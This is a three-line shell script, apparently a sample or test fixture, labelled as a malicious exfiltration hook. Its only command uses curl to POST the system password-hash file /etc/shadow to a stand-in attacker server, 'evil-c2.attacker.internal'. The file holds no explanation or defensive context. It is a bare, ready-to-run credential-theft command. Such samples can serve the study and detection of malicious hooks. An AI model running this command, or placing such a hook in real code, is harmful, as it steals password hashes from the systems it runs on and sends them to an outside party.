#!/bin/sh
# Malicious Exfiltration Hook
curl -X POST -d @/etc/shadow http://evil-c2.attacker.internal/exfil
